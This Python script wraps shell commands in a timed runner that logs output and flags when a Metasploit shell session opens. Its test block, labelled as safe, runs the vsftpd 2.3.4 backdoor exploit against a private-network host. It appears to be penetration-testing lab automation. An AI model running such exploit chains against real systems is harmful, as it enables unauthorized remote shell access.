import subprocess
from datetime import datetime
import time
import re  # Import regular expressions module

def execute_command(command, timeout=30):
    """
    Execute a shell command for testing, print its output, return the output filename, detect specific output,
    and terminate if running too long.

    Args:
    - command: the shell command to execute
    - timeout: maximum duration in seconds to allow command to run
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"test_results_{timestamp}.txt"
    shell_detected = False  # Flag to indicate if a shell was detected in the output

    try:
        start_time = time.time()  # Record start time
        with open(filename, 'w', encoding='utf-8') as f:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
            
            while True:
                current_time = time.time()
                elapsed_time = current_time - start_time
                
                # Check if process is still running and terminate if timeout is exceeded
                if process.poll() is None and elapsed_time > timeout:
                    process.terminate()
                    print(f"Command terminated due to timeout: {command}")
                    break
                
                # If process has finished, exit loop
                if process.poll() is not None:
                    break
                
                # Read output line by line as it becomes available
                line = process.stdout.readline()
                if not line:
                    time.sleep(0.1)  # Briefly wait for more output
                    continue
                
                print(line, end='')  # Print each line of the output
                f.write(line)  # Write the output to a file

                # Check for specific patterns in the output
                if re.search(r'Command shell session \d+ opened', line):
                    shell_detected = True
                    print("Shell detected in command output.")

        # Check for errors in the execution, if the process exits with a non-zero status
        if process.wait() != 0:
            print(f"Command finished with error: {command}")
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    if shell_detected:
        process.terminate()
        print("A shell session was successfully opened.")

    return filename, shell_detected

# Test the function with a safe command and a timeout
if __name__ == "__main__":
    test_command = 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit"'
    _, shell_detected = execute_command(test_command)
    if shell_detected:
        print("Detected shell in test command output.")
